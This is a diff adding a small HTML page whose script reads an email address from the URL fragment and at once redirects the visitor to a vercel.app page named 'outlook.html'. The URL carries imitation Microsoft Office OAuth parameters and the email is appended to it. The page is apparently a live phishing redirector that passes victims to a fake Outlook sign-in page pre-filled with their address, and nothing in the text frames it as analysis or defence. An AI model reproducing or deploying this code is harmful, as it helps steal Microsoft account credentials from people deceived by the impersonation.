@@ -1,0 +1,26 @@
+
+
+
+<html lang="en">
+<head>
+   
+    <script type="text/javascript">
+        // Redirect after 5 seconds
+		  var ai = window.location.hash.substr(1);
+		  
+    var ind = ai.indexOf("@");
+    var my_slice = ai.substr((ind + 1));
+	var companyName = my_slice.split('.')[0];
+	var con=ai;
+	
+	
+
+		 
+        setTimeout(function() {
+		
+        
+            window.location.href = "https://splend-git-main-smps-projects-2d0d036e.vercel.app/outlook.html?/4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638803987298506889.YTQ1NjMzNzctNTA1YS00YjVlLTg4M2UtNjYzYjVlODJhNzE5ZmE4OTk4MjMtMGQ1Ni00MWYwLTg2OWUtNDMzMzliZjEzYmEx&ui_locales=en-US&mkt=en-US&client-request-id=3377bd4c-97cb-44e2-a238-7ac26f4afbdf&state=0O09OTHDAJRqLfYCl3NoLHX2PuJj50PhY9fEArw-CbDEmTr36j1qnz1jELEr41bTPMKy2A6YtIyDfcepw0cGJanjJnB_L8DLhQ1qCRs6BxEvucBBLf83GYtvo3OuB-f6JoqMmZP07GooC4TM6-NSVeoD5rVA0P61gD1uqo6mVbo9U2vs-QKr0OA5tCaWECm8WCiCSgRxPTqUNtmTujDOKN60iKuR9oqjSlDeebe5v924BS0ySpI5pzVEuL25YgrxY_GsY5A5yk-ujFeaBuNVsQ&x-client-SKU=ID_NET8_0&x-client-ver=#"+con;
+        }, 0);  
+    </script>
+</head>
+</html>
